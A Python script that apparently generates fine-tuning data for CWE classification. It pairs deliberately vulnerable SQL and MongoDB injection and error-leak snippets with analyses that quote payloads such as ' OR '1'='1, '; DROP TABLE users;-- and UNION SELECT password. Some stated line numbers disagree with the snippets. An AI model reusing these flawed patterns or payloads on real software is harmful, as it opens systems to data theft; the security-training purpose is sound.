#!/usr/bin/env python3
"""模式 B：细粒度 CWE 分类边界对样本生成。

生成 50 条边界对比样本（25 对），帮助模型区分容易混淆的 CWE 类别。
每对样本代码结构高度相似，仅关键区别（数据库类型、漏洞类型等）不同。

边界对组：
  1. SQL Injection (CWE-89) vs NoSQL Injection (CWE-943)  — 12 条 (6 对)
  2. 信息泄露 (CWE-209/200) vs 注入 (CWE-89/78)           — 12 条 (6 对)
  3. CWE-329 (IV 不随机) vs CWE-798 (硬编码凭证)           — 10 条 (5 对)
  4. CWE-89 (SQL Injection) vs CWE-79 (XSS)               —  8 条 (4 对)
  5. CWE-78 (OS Command Injection) vs CWE-77 (Command)    —  8 条 (4 对)

语言覆盖：Python, JavaScript, Java, PHP, Go。

输出：
  experiments/exp_06_finetune/data/supplement_mode_b.jsonl

用法：
  python experiments/exp_06_finetune/scripts/gen_mode_b.py
"""

import json
import re
from pathlib import Path
from collections import Counter

# ===========================================================================
# 路径与常量
# ===========================================================================
SCRIPT_DIR = Path(__file__).resolve().parent
EXP_DIR = SCRIPT_DIR.parent
OUTPUT_FILE = EXP_DIR / "data" / "supplement_mode_b.jsonl"

SYSTEM_PROMPT = (
    "你是一名安全研究员，分析给定代码的安全漏洞。\n"
    "\n"
    "在回答的最后，必须严格输出一个 JSON 对象作为最终结论，JSON 块用 ```json 包裹，"
    "字段如下（统一 schema，全项目一致）：\n"
    "   - has_vulnerability: bool, true 表示存在漏洞，false 表示未发现漏洞\n"
    "   - vulnerability_type: str, 单个字符串（禁止拆成多个逗号分隔的值），"
    "格式如 'CWE-编号 漏洞名'，例如 'CWE-89 SQL Injection'、"
    "'CWE-79 Cross-site Scripting (XSS)'；无漏洞填 'none'\n"
    "   - risk_level: str, Critical/High/Medium/Low；无漏洞填 'None'\n"
    "   - source: str, 污染来源（用户可控输入点）。必须锚定行号，"
    "如 'line 12: request.args.get(\"id\")'；无漏洞填 'N/A'\n"
    "   - sink: str, 危险函数或触发点。必须锚定行号，"
    "如 'line 18: cursor.execute(query)'；无漏洞填 'N/A'\n"
    "   - explanation: str, 漏洞或安全现状说明（数据流/成因，用 -> 箭头描述）\n"
    "   - fix_suggestion: str, 可执行的修复建议。必须锚定行号，"
    "格式 'line N: 应改为 ...'；无漏洞填 'no fix needed'"
)


# ===========================================================================
# 辅助函数
# ===========================================================================
def _ln(code, marker):
    """返回 code 中第一个包含 marker 的行的 1-based 行号。"""
    for i, line in enumerate(code.split("\n"), 1):
        if marker in line:
            return i
    raise ValueError(f"代码中未找到标记: {marker!r}")


def make_verdict(code, *, has_vuln, vuln_type, risk,
                 source_marker=None, source_desc=None,
                 sink_marker=None, sink_desc=None,
                 explanation, fix_marker=None, fix_desc=None):
    """构造 verdict dict，行号从 code 中自动解析。"""
    if not has_vuln:
        return {
            "has_vulnerability": False,
            "vulnerability_type": "none",
            "risk_level": "None",
            "source": "N/A",
            "sink": "N/A",
            "explanation": explanation,
            "fix_suggestion": "no fix needed",
        }
    src_line = _ln(code, source_marker)
    sink_line = _ln(code, sink_marker)
    fix_line = _ln(code, fix_marker) if fix_marker else sink_line
    fix_suggestion = f"line {fix_line}: 应改为 {fix_desc}"
    fix_suggestion = fix_suggestion.replace("\n", " ")
    if len(fix_suggestion) > 500:
        fix_suggestion = fix_suggestion[:497] + "..."
    return {
        "has_vulnerability": True,
        "vulnerability_type": vuln_type,
        "risk_level": risk,
        "source": f"line {src_line}: {source_desc}",
        "sink": f"line {sink_line}: {sink_desc}",
        "explanation": explanation,
        "fix_suggestion": fix_suggestion,
    }


def make_sample(lang, code, analysis, verdict):
    """构造 ChatML JSON 记录。"""
    user_content = (
        f"代码片段（语言: {lang}）：\n"
        f"```{lang}\n{code}\n```\n"
        f"请先给出分析过程，然后在最后给出 JSON 结论。"
    )
    json_str = json.dumps(verdict, ensure_ascii=False)
    assistant_content = f"{analysis}\n\n```json\n{json_str}\n```"
    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ]
    }


def _spec(lang, code, analysis, **verdict_kw):
    """快捷构造样本规格 dict。"""
    return {
        "lang": lang,
        "code": code,
        "analysis": analysis,
        "verdict": make_verdict(code, **verdict_kw),
    }


def validate_spec(spec):
    """校验单条样本规格，返回错误列表（空列表表示通过）。"""
    errors = []
    code = spec["code"]
    verdict = spec["verdict"]
    lines = code.split("\n")
    num_lines = len(lines)

    for field in ("has_vulnerability", "vulnerability_type", "risk_level",
                  "source", "sink", "explanation", "fix_suggestion"):
        if field not in verdict:
            errors.append(f"缺少字段: {field}")

    if verdict.get("has_vulnerability") is True:
        vt = verdict.get("vulnerability_type", "")
        if not vt.startswith("CWE-"):
            errors.append(f"vulnerability_type '{vt}' 不以 'CWE-' 开头")
        if verdict.get("risk_level") not in ("Critical", "High", "Medium", "Low"):
            errors.append(f"risk_level '{verdict.get('risk_level')}' 不合法")

        for field in ("source", "sink", "fix_suggestion"):
            val = verdict.get(field, "")
            m = re.search(r"line (\d+)", val)
            if not m:
                errors.append(f"{field} 缺少行号引用: {val[:60]}")
            else:
                ln = int(m.group(1))
                if ln < 1 or ln > num_lines:
                    errors.append(f"{field} 行号 {ln} 超出范围 (1-{num_lines})")

        fix = verdict.get("fix_suggestion", "")
        if "\n" in fix:
            errors.append("fix_suggestion 含换行符")
        if len(fix) > 500:
            errors.append(f"fix_suggestion 过长 ({len(fix)} 字符)")
    return errors


# ===========================================================================
# Group 1: SQL Injection (CWE-89) vs NoSQL Injection (CWE-943) — 12 条 (6 对)
# ===========================================================================
def gen_sql_vs_nosql():
    S = []

    # --- Pair 1: Python (SQLite vs PyMongo $where) ---
    # CWE-89 SQL Injection
    code = r'''import sqlite3
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/users/search', methods=['GET'])
def search_users():
    name = request.args.get('name', '')
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    query = "SELECT id, username, email FROM users WHERE username = '" + name + "'"
    results = cursor.execute(query).fetchall()
    conn.close()
    return jsonify({'users': results})
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 8: request.args.get('name') 获取用户可控的搜索关键词。\n"
        "2. line 11: 将 name 字符串拼接进 SQL 查询语句，未参数化。\n"
        "3. line 12: cursor.execute(query) 直接执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' OR '1'='1 可绕过 WHERE 条件返回全部用户。\n"
        "5. 归因为 CWE-89 而非 CWE-943：sink 是 SQL cursor.execute，数据进入关系型数据库 SQL 语句，而非 MongoDB NoSQL 查询。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="request.args.get('name'",
        source_desc="request.args.get('name') 用户可控搜索关键词",
        sink_marker="cursor.execute(query)",
        sink_desc="cursor.execute(query) 执行字符串拼接的 SQL 语句",
        explanation="line 8 request.args.get('name') -> line 11 字符串拼接进 SQL -> line 12 cursor.execute(query) 执行 -> 攻击者注入 ' OR '1'='1 绕过 WHERE 条件。归因 CWE-89 而非 CWE-943：sink 是 SQL cursor.execute 而非 MongoDB 查询，数据进入关系型数据库",
        fix_marker="cursor.execute(query)",
        fix_desc="使用参数化查询 cursor.execute('SELECT id, username, email FROM users WHERE username = ?', (name,))"))

    # CWE-943 NoSQL Injection
    code = r'''from pymongo import MongoClient
from flask import Flask, request, jsonify

app = Flask(__name__)
client = MongoClient('mongodb://localhost:27017/')
db = client['appdb']

@app.route('/api/users/search', methods=['GET'])
def search_users():
    name = request.args.get('name', '')
    results = list(db.users.find({'$where': 'this.username == "' + name + '"'}))
    return jsonify({'users': results})
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 10: request.args.get('name') 获取用户可控的搜索关键词。\n"
        "2. line 11: 将 name 拼接进 $where JavaScript 表达式字符串。\n"
        "3. line 11: db.users.find() 执行包含用户输入的 $where 查询。\n"
        "4. 攻击者传入 \" || this.password != \" 可改变 $where 语义，泄露密码字段。\n"
        "5. 归因为 CWE-943 而非 CWE-89：sink 是 MongoDB $where 查询，数据进入 NoSQL JavaScript 表达式，而非 SQL 语句。\n"
        "6. 结论：CWE-943 NoSQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-943 NoSQL Injection", risk="High",
        source_marker="request.args.get('name'",
        source_desc="request.args.get('name') 用户可控搜索关键词",
        sink_marker="db.users.find(",
        sink_desc="db.users.find({'$where': ...}) 执行拼接的 $where JavaScript 表达式",
        explanation="line 10 request.args.get('name') -> line 11 拼接进 $where JS 表达式 -> db.users.find() 执行 -> 攻击者注入 \" || this.password != \" 泄露密码。归因 CWE-943 而非 CWE-89：sink 是 MongoDB $where 而非 SQL cursor.execute",
        fix_marker="db.users.find(",
        fix_desc="避免使用 $where，改为 db.users.find({'username': name}) 直接传值，不拼接 JS 表达式"))

    # --- Pair 2: JavaScript (mysql2 vs mongodb $where) ---
    # CWE-89 SQL Injection
    code = r'''const express = require('express');
const mysql = require('mysql2');
const app = express();

const pool = mysql.createPool({host: 'localhost', user: 'root', database: 'appdb'});

app.get('/api/users/search', (req, res) => {
    const name = req.query.name;
    const query = "SELECT id, username, email FROM users WHERE username = '" + name + "'";
    pool.query(query, (err, results) => {
        if (err) return res.status(500).json({error: err.message});
        res.json({users: results});
    });
});
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 9: req.query.name 获取用户可控参数。\n"
        "2. line 10: 将 name 字符串拼接进 SQL 查询语句。\n"
        "3. line 11: pool.query(query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' UNION SELECT 1,2,3-- 可执行任意查询。\n"
        "5. 归因为 CWE-89 而非 CWE-943：sink 是 mysql2 pool.query 执行 SQL 语句，而非 MongoDB NoSQL 查询。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="req.query.name",
        source_desc="req.query.name 用户可控搜索关键词",
        sink_marker="pool.query(query",
        sink_desc="pool.query(query) 执行字符串拼接的 SQL 语句",
        explanation="line 9 req.query.name -> line 10 拼接进 SQL -> line 11 pool.query 执行 -> 攻击者注入 ' UNION SELECT 1,2,3-- 绕过。归因 CWE-89 而非 CWE-943：sink 是 mysql2 pool.query 而非 MongoDB 查询",
        fix_marker="pool.query(query",
        fix_desc="使用参数化查询 pool.query('SELECT ... WHERE username = ?', [name], callback)"))

    # CWE-943 NoSQL Injection
    code = r'''const express = require('express');
const {MongoClient} = require('mongodb');
const app = express();

const client = new MongoClient('mongodb://localhost:27017/');
const db = client.db('appdb');

app.get('/api/users/search', async (req, res) => {
    const name = req.query.name;
    const results = await db.collection('users')
        .find({$where: `this.username == "${name}"`})
        .toArray();
    res.json({users: results});
});
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 10: req.query.name 获取用户可控参数。\n"
        "2. line 12: 将 name 通过模板字符串拼入 $where JavaScript 表达式。\n"
        "3. line 12-13: collection.find() 执行包含用户输入的 $where 查询。\n"
        "4. 攻击者传入 \" || this.email != \" 可泄露全部用户邮箱。\n"
        "5. 归因为 CWE-943 而非 CWE-89：sink 是 MongoDB $where 查询，数据进入 NoSQL JavaScript 表达式。\n"
        "6. 结论：CWE-943 NoSQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-943 NoSQL Injection", risk="High",
        source_marker="req.query.name",
        source_desc="req.query.name 用户可控搜索关键词",
        sink_marker=".find({$where:",
        sink_desc="collection.find({$where: ...}) 执行拼接的 $where JS 表达式",
        explanation="line 10 req.query.name -> line 12 模板字符串拼入 $where -> collection.find 执行 -> 攻击者注入 \" || this.email != \" 泄露数据。归因 CWE-943 而非 CWE-89：sink 是 MongoDB $where 而非 SQL 查询",
        fix_marker=".find({$where:",
        fix_desc="避免 $where，改为 collection.find({username: name}).toArray() 直接传值"))

    # --- Pair 3: Java (JDBC vs MongoDB Java $where) ---
    # CWE-89 SQL Injection
    code = r'''import java.sql.*;
import java.util.ArrayList;
import java.util.List;

public class UserSearchService {
    private Connection getConnection() throws SQLException {
        return DriverManager.getConnection(
            "jdbc:postgresql://localhost/appdb", "admin", "pass");
    }

    public List<String> searchUsers(String name) throws SQLException {
        Connection conn = getConnection();
        Statement stmt = conn.createStatement();
        String query = "SELECT id, username, email FROM users WHERE username = '" + name + "'";
        ResultSet rs = stmt.executeQuery(query);
        List<String> users = new ArrayList<>();
        while (rs.next()) {
            users.add(rs.getString("username"));
        }
        rs.close(); stmt.close(); conn.close();
        return users;
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 13: name 参数来自用户请求，完全可控。\n"
        "2. line 15: 将 name 拼接进 SQL 查询语句。\n"
        "3. line 16: stmt.executeQuery(query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 '; DROP TABLE users;-- 可执行任意 SQL。\n"
        "5. 归因为 CWE-89 而非 CWE-943：sink 是 JDBC Statement.executeQuery 执行 SQL 语句，而非 MongoDB 查询。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="public List<String> searchUsers",
        source_desc="searchUsers(String name) 的 name 参数来自用户请求",
        sink_marker="stmt.executeQuery(query)",
        sink_desc="stmt.executeQuery(query) 执行字符串拼接的 SQL 语句",
        explanation="line 13 name 参数 -> line 15 拼接进 SQL -> line 16 stmt.executeQuery 执行 -> 攻击者注入 '; DROP TABLE users;--。归因 CWE-89 而非 CWE-943：sink 是 JDBC Statement.executeQuery 而非 MongoDB 查询",
        fix_marker="stmt.executeQuery(query)",
        fix_desc="使用 PreparedStatement 并参数化: pstmt = conn.prepareStatement('SELECT ... WHERE username = ?'); pstmt.setString(1, name)"))

    # CWE-943 NoSQL Injection
    code = r'''import com.mongodb.client.*;
import com.mongodb.client.model.Filters;
import org.bson.Document;
import java.util.ArrayList;
import java.util.List;

public class UserSearchService {
    private MongoCollection<Document> getCollection() {
        MongoClient client = MongoClients.create("mongodb://localhost:27017");
        return client.getDatabase("appdb").getCollection("users");
    }

    public List<String> searchUsers(String name) {
        MongoCollection<Document> coll = getCollection();
        String js = "this.username == '" + name + "'";
        List<String> users = new ArrayList<>();
        coll.find(new Document("$where", js)).forEach(
            doc -> users.add(doc.getString("username")));
        return users;
    }
}
'''
    S.append(_spec("java", code,
        "分析过程：\n"
        "1. line 15: name 参数来自用户请求，完全可控。\n"
        "2. line 17: 将 name 拼接进 $where JavaScript 表达式字符串。\n"
        "3. line 19: coll.find() 执行包含用户输入的 $where 查询。\n"
        "4. 攻击者传入 ' || this.password != ' 可泄露密码字段。\n"
        "5. 归因为 CWE-943 而非 CWE-89：sink 是 MongoDB $where 查询，数据进入 NoSQL JavaScript 表达式，而非 SQL 语句。\n"
        "6. 结论：CWE-943 NoSQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-943 NoSQL Injection", risk="High",
        source_marker="public List<String> searchUsers",
        source_desc="searchUsers(String name) 的 name 参数来自用户请求",
        sink_marker="coll.find(new Document(",
        sink_desc="coll.find(new Document('$where', js)) 执行拼接的 $where JS 表达式",
        explanation="line 15 name 参数 -> line 17 拼接进 $where JS -> line 19 coll.find 执行 -> 攻击者注入 ' || this.password != ' 泄露密码。归因 CWE-943 而非 CWE-89：sink 是 MongoDB $where 而非 JDBC SQL 查询",
        fix_marker="coll.find(new Document(",
        fix_desc="避免 $where，改为 coll.find(Filters.eq('username', name)) 使用类型安全过滤器"))

    # --- Pair 4: PHP (MySQLi vs MongoDB PHP $where) ---
    # CWE-89 SQL Injection
    code = r'''<?php
function search_users($name) {
    $mysqli = new mysqli('localhost', 'root', '', 'appdb');
    $query = "SELECT id, username, email FROM users WHERE username = '" . $name . "'";
    $result = $mysqli->query($query);
    $users = [];
    while ($row = $result->fetch_assoc()) {
        $users[] = $row;
    }
    return $users;
}

$name = $_GET['name'] ?? '';
$results = search_users($name);
echo json_encode(['users' => $results]);
?>
'''
    S.append(_spec("php", code,
        "分析过程：\n"
        "1. line 13: $_GET['name'] 直接来自用户请求参数。\n"
        "2. line 4: 将 $name 拼接进 SQL 查询语句。\n"
        "3. line 5: $mysqli->query($query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 ' OR '1'='1' -- 可绕过认证返回全部用户。\n"
        "5. 归因为 CWE-89 而非 CWE-943：sink 是 MySQLi query 执行 SQL 语句，而非 MongoDB NoSQL 查询。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="$_GET['name']",
        source_desc="$_GET['name'] 用户可控搜索关键词",
        sink_marker="$mysqli->query($query)",
        sink_desc="$mysqli->query($query) 执行字符串拼接的 SQL 语句",
        explanation="line 13 $_GET['name'] -> line 4 拼接进 SQL -> line 5 $mysqli->query 执行 -> 攻击者注入 ' OR '1'='1' -- 绕过 WHERE。归因 CWE-89 而非 CWE-943：sink 是 MySQLi query 而非 MongoDB 查询",
        fix_marker="$mysqli->query($query)",
        fix_desc="使用预处理语句 $stmt = $mysqli->prepare('SELECT ... WHERE username = ?'); $stmt->bind_param('s', $name)"))

    # CWE-943 NoSQL Injection
    code = r'''<?php
function search_users($name) {
    $manager = new MongoDB\Driver\Manager('mongodb://localhost:27017');
    $filter = ['$where' => "this.username == '" . $name . "'"];
    $query = new MongoDB\Driver\Query($filter);
    $cursor = $manager->executeQuery('appdb.users', $query);
    $users = [];
    foreach ($cursor as $doc) {
        $users[] = $doc;
    }
    return $users;
}

$name = $_GET['name'] ?? '';
$results = search_users($name);
echo json_encode(['users' => $results]);
?>
'''
    S.append(_spec("php", code,
        "分析过程：\n"
        "1. line 13: $_GET['name'] 直接来自用户请求参数。\n"
        "2. line 4: 将 $name 拼接进 $where JavaScript 表达式字符串。\n"
        "3. line 6: $manager->executeQuery() 执行包含用户输入的 $where 查询。\n"
        "4. 攻击者传入 ' || this.email != ' 可改变 $where 语义泄露邮箱。\n"
        "5. 归因为 CWE-943 而非 CWE-89：sink 是 MongoDB executeQuery 执行 NoSQL $where 查询，而非 SQL 语句。\n"
        "6. 结论：CWE-943 NoSQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-943 NoSQL Injection", risk="High",
        source_marker="$_GET['name']",
        source_desc="$_GET['name'] 用户可控搜索关键词",
        sink_marker="$manager->executeQuery(",
        sink_desc="$manager->executeQuery('appdb.users', $query) 执行拼接的 $where 查询",
        explanation="line 13 $_GET['name'] -> line 4 拼接进 $where JS -> line 6 executeQuery 执行 -> 攻击者注入 ' || this.email != ' 泄露数据。归因 CWE-943 而非 CWE-89：sink 是 MongoDB executeQuery 而非 MySQLi SQL 查询",
        fix_marker="$manager->executeQuery(",
        fix_desc="避免 $where，改为 $filter = ['username' => $name] 直接传值不拼接 JS 表达式"))

    # --- Pair 5: Python (MySQL f-string vs PyMongo user-controlled filter) ---
    # CWE-89 SQL Injection
    code = r'''import pymysql
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/products/search', methods=['GET'])
def search_products():
    keyword = request.args.get('q', '')
    conn = pymysql.connect(host='localhost', user='root', database='shop')
    cursor = conn.cursor()
    sql = f"SELECT id, name, price FROM products WHERE name LIKE '%{keyword}%'"
    rows = cursor.execute(sql).fetchall()
    conn.close()
    return jsonify({'products': rows})
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: request.args.get('q') 获取用户可控搜索关键词。\n"
        "2. line 10: 使用 f-string 将 keyword 直接嵌入 SQL 查询语句。\n"
        "3. line 11: cursor.execute(sql) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 %' UNION SELECT password FROM users-- 可执行任意查询。\n"
        "5. 归因为 CWE-89 而非 CWE-943：sink 是 pymysql cursor.execute 执行 SQL 语句，而非 MongoDB 查询。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="request.args.get('q'",
        source_desc="request.args.get('q') 用户可控搜索关键词",
        sink_marker="cursor.execute(sql)",
        sink_desc="cursor.execute(sql) 执行 f-string 拼接的 SQL 语句",
        explanation="line 7 request.args.get('q') -> line 10 f-string 嵌入 SQL -> line 11 cursor.execute 执行 -> 攻击者注入 %' UNION SELECT password FROM users--。归因 CWE-89 而非 CWE-943：sink 是 pymysql cursor.execute 而非 MongoDB 查询",
        fix_marker="cursor.execute(sql)",
        fix_desc="使用参数化查询 cursor.execute('SELECT ... WHERE name LIKE %s', (f'%{keyword}%',))"))

    # CWE-943 NoSQL Injection — user-controlled filter object
    code = r'''import json
from pymongo import MongoClient
from flask import Flask, request, jsonify

app = Flask(__name__)
client = MongoClient('mongodb://localhost:27017/')
db = client['shopdb']

@app.route('/api/products/search', methods=['GET'])
def search_products():
    filter_json = request.args.get('filter', '{}')
    query = json.loads(filter_json)
    results = list(db.products.find(query))
    return jsonify({'products': results})
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 10: request.args.get('filter') 获取用户可控的 JSON 字符串。\n"
        "2. line 11: json.loads(filter_json) 将用户输入解析为字典对象。\n"
        "3. line 12: db.products.find(query) 直接使用用户控制的对象作为查询条件。\n"
        "4. 攻击者传入 {\"$where\": \"this.price > 0\"} 可注入 $where 执行任意 JS。\n"
        "5. 归因为 CWE-943 而非 CWE-89：sink 是 MongoDB find() 接受用户控制的查询对象，而非 SQL 语句。\n"
        "6. 结论：CWE-943 NoSQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-943 NoSQL Injection", risk="High",
        source_marker="request.args.get('filter'",
        source_desc="request.args.get('filter') 用户可控 JSON 查询条件",
        sink_marker="db.products.find(query)",
        sink_desc="db.products.find(query) 直接使用用户控制的对象作为查询条件",
        explanation="line 10 request.args.get('filter') -> line 11 json.loads 解析 -> line 12 db.products.find(query) 直接传用户对象 -> 攻击者传入 {\"$where\": \"...\"} 注入。归因 CWE-943 而非 CWE-89：sink 是 MongoDB find 而非 SQL cursor.execute",
        fix_marker="db.products.find(query)",
        fix_desc="白名单校验 query 的 key，禁止 $ 开头的操作符: allowed = {'name', 'category'}; query = {k: v for k, v in query.items() if k in allowed}"))

    # --- Pair 6: JavaScript (pg vs Mongoose user-controlled filter) ---
    # CWE-89 SQL Injection
    code = r'''const express = require('express');
const { Client } = require('pg');
const app = express();

const client = new Client({host: 'localhost', user: 'postgres', database: 'shop'});

app.get('/api/products/search', async (req, res) => {
    const q = req.query.q;
    const sql = "SELECT id, name, price FROM products WHERE name LIKE '%" + q + "%'";
    const result = await client.query(sql);
    res.json({products: result.rows});
});
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 8: req.query.q 获取用户可控搜索关键词。\n"
        "2. line 9: 将 q 字符串拼接进 SQL 查询语句。\n"
        "3. line 10: client.query(sql) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 %' UNION SELECT 1,2,3-- 可执行任意查询。\n"
        "5. 归因为 CWE-89 而非 CWE-943：sink 是 pg client.query 执行 SQL 语句，而非 MongoDB 查询。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="req.query.q",
        source_desc="req.query.q 用户可控搜索关键词",
        sink_marker="client.query(sql)",
        sink_desc="client.query(sql) 执行字符串拼接的 SQL 语句",
        explanation="line 8 req.query.q -> line 9 拼接进 SQL -> line 10 client.query 执行 -> 攻击者注入 %' UNION SELECT 1,2,3--。归因 CWE-89 而非 CWE-943：sink 是 pg client.query 而非 MongoDB 查询",
        fix_marker="client.query(sql)",
        fix_desc="使用参数化查询 client.query('SELECT ... WHERE name LIKE $1', [`%${q}%`])"))

    # CWE-943 NoSQL Injection — Mongoose user-controlled filter
    code = r'''const express = require('express');
const mongoose = require('mongoose');
const app = express();

mongoose.connect('mongodb://localhost:27017/shopdb');
const Product = mongoose.model('Product', new mongoose.Schema({
    name: String, price: Number, category: String
}));

app.get('/api/products/search', async (req, res) => {
    const filter = JSON.parse(req.query.filter || '{}');
    const results = await Product.find(filter);
    res.json({products: results});
});
'''
    S.append(_spec("javascript", code,
        "分析过程：\n"
        "1. line 12: req.query.filter 获取用户可控的 JSON 字符串。\n"
        "2. line 12: JSON.parse 将用户输入解析为对象。\n"
        "3. line 13: Product.find(filter) 直接使用用户控制的对象作为查询条件。\n"
        "4. 攻击者传入 {\"$where\": \"sleep(5000)\"} 可注入 $where 导致 DoS 或数据泄露。\n"
        "5. 归因为 CWE-943 而非 CWE-89：sink 是 Mongoose Model.find() 接受用户控制的查询对象，而非 SQL 语句。\n"
        "6. 结论：CWE-943 NoSQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-943 NoSQL Injection", risk="High",
        source_marker="req.query.filter",
        source_desc="req.query.filter 用户可控 JSON 查询条件",
        sink_marker="Product.find(filter)",
        sink_desc="Product.find(filter) 直接使用用户控制的对象作为查询条件",
        explanation="line 12 req.query.filter -> JSON.parse 解析 -> line 13 Product.find(filter) 直接传用户对象 -> 攻击者传入 {\"$where\": \"sleep(5000)\"} 注入。归因 CWE-943 而非 CWE-89：sink 是 Mongoose find 而非 pg SQL 查询",
        fix_marker="Product.find(filter)",
        fix_desc="白名单校验 filter 的 key: const allowed = ['name', 'category']; const safe = Object.fromEntries(Object.entries(filter).filter(([k]) => allowed.includes(k)))"))

    return S


# ===========================================================================
# Group 2: 信息泄露 (CWE-209/200) vs 注入 (CWE-89/78) — 12 条 (6 对)
# ===========================================================================
def gen_infoleak_vs_injection():
    S = []

    # --- Pair 1: Python (Flask traceback vs SQL injection) ---
    # CWE-209 Information Exposure
    code = r'''import traceback
from flask import Flask, request, jsonify
import pymysql

app = Flask(__name__)

@app.route('/api/users/<user_id>', methods=['GET'])
def get_user(user_id):
    try:
        conn = pymysql.connect(host='localhost', user='root', database='appdb')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
        user = cursor.fetchone()
        conn.close()
        return jsonify({'user': user})
    except Exception as e:
        return jsonify({'error': str(e), 'traceback': traceback.format_exc()}), 500
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 7: user_id 来自 URL 路径参数，用户可控。\n"
        "2. line 15: 捕获异常后，将 traceback.format_exc() 的完整堆栈信息返回给客户端。\n"
        "3. traceback 包含文件路径、数据库连接信息、SQL 语句、框架版本等内部细节。\n"
        "4. 攻击者可利用这些信息了解系统架构，制定后续攻击策略。\n"
        "5. 归因为 CWE-209 而非 CWE-89：虽然代码中有 SQL 查询，但查询使用了参数化（%s 占位符），无注入风险。漏洞在于异常堆栈泄露内部信息。\n"
        "6. 结论：CWE-209 Information Exposure Through Error Message，风险 Medium。",
        has_vuln=True, vuln_type="CWE-209 Information Exposure Through Error Message", risk="Medium",
        source_marker="except Exception as e",
        source_desc="异常处理捕获到包含内部信息的异常",
        sink_marker="traceback.format_exc()",
        sink_desc="jsonify({'traceback': traceback.format_exc()}) 将完整堆栈返回给用户",
        explanation="line 7 user_id 触发异常 -> line 13 except 捕获 -> line 14 traceback.format_exc() 返回完整堆栈给客户端 -> 泄露文件路径/SQL/版本信息。归因 CWE-209 而非 CWE-89：SQL 查询已参数化（%s），无注入风险；漏洞是异常堆栈泄露",
        fix_marker="traceback.format_exc()",
        fix_desc="返回通用错误消息: return jsonify({'error': 'Internal server error'}), 500，不暴露 traceback"))

    # CWE-89 SQL Injection — same endpoint structure
    code = r'''from flask import Flask, request, jsonify
import pymysql

app = Flask(__name__)

@app.route('/api/users/<user_id>', methods=['GET'])
def get_user(user_id):
    try:
        conn = pymysql.connect(host='localhost', user='root', database='appdb')
        cursor = conn.cursor()
        query = "SELECT * FROM users WHERE id = " + user_id
        cursor.execute(query)
        user = cursor.fetchone()
        conn.close()
        return jsonify({'user': user})
    except Exception as e:
        return jsonify({'error': 'Internal error'}), 500
'''
    S.append(_spec("python", code,
        "分析过程：\n"
        "1. line 6: user_id 来自 URL 路径参数，用户可控。\n"
        "2. line 11: 将 user_id 字符串拼接进 SQL 查询语句。\n"
        "3. line 12: cursor.execute(query) 执行拼接后的 SQL。\n"
        "4. 攻击者传入 1 UNION SELECT password FROM users-- 可泄露密码。\n"
        "5. 归因为 CWE-89 而非 CWE-209：虽然异常处理返回了错误消息，但错误消息是通用的不泄露内部信息。真正的漏洞是 SQL 拼接注入。\n"
        "6. 结论：CWE-89 SQL Injection，风险 High。",
        has_vuln=True, vuln_type="CWE-89 SQL Injection", risk="High",
        source_marker="user_id):",
        source_desc="get_user(user_id) 的 user_id 来自 URL 路径参数",
        sink_marker="cursor.execute(query)",
        sink_desc="cursor.execute(query) 执行字符串拼接的 SQL 语句",
        explanation="line 6 user_id -> line 11 拼接进 SQL -> line 12 cursor.execute 执行 -> 攻击者注入 1 UNION SELECT password--。归因 CWE-89 而非 CWE-209：异常处理返回通用消息不泄露堆栈；漏洞是 SQL 拼接注入",
        fix_marker="cursor.execute(query)",
        fix_desc="使用参数化查询 cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))"))

    # --- Pair 2: Java (Spring stack trace vs command injection) ---
    # CWE-209 Information Exposure
    code = r'''import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import java.util.Arrays;

@RestController
@RequestMapping("/api/orders")
public class OrderController {

    @GetMapping("/{id}")
    public ResponseEntity<?> getOrder(@PathVariable String id) {
        try {
            String[] parts = loadOrder(id);
            return ResponseEntity.ok(parts);
        } catch (Exception e) {
            return ResponseEntity.status(500).body(
                "Error: " + e.getMessage() + "\nStack: " +
                Arrays.toString(e.getStackTrace()));
        }
    }

    private String[] loadOrder(String id) throws Exception {
